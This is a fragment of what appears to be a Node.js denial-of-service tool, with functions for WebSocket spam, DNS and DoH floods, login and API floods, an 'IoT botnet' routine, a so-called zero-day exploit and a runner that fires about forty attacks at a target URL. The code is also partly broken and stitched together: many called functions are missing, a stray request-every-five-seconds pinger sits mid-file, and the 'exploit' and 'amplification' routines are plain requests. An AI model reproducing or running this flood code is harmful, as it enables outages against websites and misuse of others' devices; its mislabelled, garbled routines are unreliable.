// Function to perform WebSocket Message Spam Flood
function websocketMessageSpamFlood() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`);

    ws.on('open', () => {
        for (let i = 0; i < 10; i++) {
            ws.send('Spam message');
        }
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform WebSocket Keepalive Abuse
function websocketKeepaliveAbuse() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`);

    ws.on('open', () => {
        ws.ping();
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform WebSocket Authentication Abuse
function websocketAuthenticationAbuse() {
    const WebSocket = require('ws');
    const ws = new WebSocket(`wss://${parsedTarget.hostname}${parsedTarget.path}`, {
        headers: {
            'Authorization': 'Basic ' + Buffer.from('user:pass').toString('base64')
        }
    });

    ws.on('open', () => {
        console.log('WebSocket connection opened with authentication');
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
    });
}

// Function to perform DoH Flood (query abuse)
function dohFlood() {
    const dns = require('dns').promises;
    const query = randomCharacters(10);

    dns.resolve(query, {
        type: 'A',
        server: parsedTarget.hostname
    })
    .catch(err => {
        console.error(`DoH error: ${err.message}`);
    });
}

// Function to perform Recursive DoH Abuse
function recursiveDohAbuse() {
    const dns = require('dns').promises;
    const query = randomCharacters(10);

    dns.resolve(query, {
        type: 'A',
        server: parsedTarget.hostname
    })
    .then(answer => {
        dns.resolve(answer[0], {
            type: 'A',
            server: parsedTarget.hostname
        })
        .catch(err => {
            console.error(`Recursive DoH error: ${err.message}`);
        });
    })
    .catch(err => {
        console.error(`Recursive DoH error: ${err.message}`);
    });
}

// Function to perform API Flood
function apiFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 443,
        path: '/api/v1/resource', // Target a specific API endpoint
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform Authentication Flood
function authFlood() {
    const options = {
        host: parsedTarget.hostname,
        port: 443,
        path: '/login', // Target the login endpoint
        method: 'POST',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': 0
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform DNS Amplification
function dnsAmplification() {
    const dns = require('dns').promises;
    const query = randomCharacters(10);
    const targetIp = parsedTarget.hostname;

    dns.resolve(query, {
        type: 'ANY',
        server: '8.8.8.8' // Use a public DNS resolver
    })
    .then(answer => {
        console.log(`Amplifying attack on ${targetIp}`);
        dns.resolve(query, {
            type: 'A',
            server: targetIp
        })
        .catch(err => {
            console.error(`DNS amplification error: ${err.message}`);
        });
    })
    .catch(err => {
        console.error(`DNS amplification error: ${err.message}`);
    });
}

// Function to perform Zero-Day Exploit
function zeroDayExploit() {
    const options = {
        host: parsedTarget.hostname,
        port: 443,
        path: '/vulnerable-endpoint', // Target the vulnerable endpoint
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (chunk) => {
            // Process data chunk
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

// Function to perform Adaptive Defense
function adaptiveDefense() {
    // Use a pre-trained machine learning model to predict and counter defenses
    const model = require('./path/to/your/model');
    const predictions = model.predict(targetData);

    predictions.forEach(prediction => {
        if (prediction.type === 'rateLimiting') {
            // Adjust attack rate
            args.Rate = prediction.adjustedRate;
        } else if (prediction.type === 'waf') {
            // Bypass WAF by changing attack vectors
            attacksToPerform = prediction.bypassedAttacks;
        }
    });
}

// Function to perform IoT Botnet Attack
function iotBotnet() {
    const iotDevices = readLines('iot-devices.txt'); // List of IoT device IPs
    iotDevices.forEach(device => {
        const options = {
            host: device,
            port: 80,
            path: '/command', // Command endpoint for the IoT device
            method: 'GET',
            headers: {
                'User-Agent': randomElement(userAgents),
                'Connection': 'Keep-Alive'
            }
        };

        const req = http.request(options, (res) => {
            res.on('data', (chunk) => {
                // Process data chunk
            });
        });

        req.on('error', (e) => {
            console.error(`Problem with request: ${e.message}`);
        });

        req.end();
    });
}

// Function to perform Horizontal DDoS Attack
function horizontalDdos() {
    const targetIps = ['192.168.1.1', '192.168.1.2', '192.168.1.3']; // Example IPs
    targetIps.forEach(ip => {
        const options = {
            host: ip,
            port: 80,
            path: parsedTarget.path,
            method: 'GET',
            headers: {
                'User-Agent': randomElement(userAgents),
                'Connection': 'Keep-Alive'
            }
        };

        const req = http.request(options, (res) => {
            res.on('data', (chunk) => {
                // Process data chunk
            });
        });

        req.on('error', (e) => {
            console.error(`Problem with request: ${e.message}`);
        });

        req.end();
    });
}

const target = process.argv[2];
const parsed = url.parse(target);

// Auto-select http or https
const client = parsed.protocol === "https:" ? https : http;

// Function to send request
function sendRequest() {
  const req = client.get(target, (res) => {
    console.log(`[${new Date().toISOString()}] Status Code: ${res.statusCode}`);
  });

  req.on("error", (err) => {
    console.log(`[${new Date().toISOString()}] Error: ${err.code || err.message}`);
  });
}

// ðŸ” Run every 5000ms (5 seconds)
setInterval(sendRequest, 5000);

console.log(`Started! Sending request every 5 seconds to ${target} ðŸš€`);

// Function to perform Multi-Vector Attack
function performMultiVectorAttack() {
    const attacksToPerform = [
        httpGetFlood, // Volumetric
        httpPostFlood, // Volumetric
        tlsHandshakeFlood, // Application-layer
        websocketConnectionFlood, // Application-layer
        http2StreamFlood, // Application-layer
        dohFlood // Application-layer
    ];
    attacksToPerform.forEach(attack => {
        attack();
    });
}

// Example usage of the attack functions
function performAttacks() {
    // Choose which attacks to perform
    const attacksToPerform = [
        httpGetFlood,
        httpPostFlood,
        httpHeadFlood,
        httpOptionsFlood,
        httpPushFlood,
        randomQueryFlood,
        recursivePageLoadFlood,
        hulkStyleFlood,
        slowlorisAttack,
        rudyAttack,
        slowReadAttack,
        httpSearchFlood,
        fileUploadFlood,
        fileDownloadFlood,
        headerSpoofFlood,
        overlongHeaderAttack,
        contentTypeAbuse,
        keepAliveAbuse,
        httpSmuggling,
        multipathAbuse,
        httpsFlood,
        tlsHandshakeFlood,
        sslRenegotiationFlood,
        http2StreamFlood,
        http2RapidResetAttack,
        http2PingFlood,
        headersSettingsFrameAbuse,
        websocketConnectionFlood,
        websocketMessageSpamFlood,
        websocketKeepaliveAbuse,
        websocketAuthenticationAbuse,
        dohFlood,
        recursiveDohAbuse,
        apiFlood,
        authFlood,
        dnsAmplification,
        zeroDayExploit,
        adaptiveDefense,
        iotBotnet,
        horizontalDdos
    ];

    // Perform each attack
    attacksToPerform.forEach(attack => {
        attack();
    });
}

performAttacks();
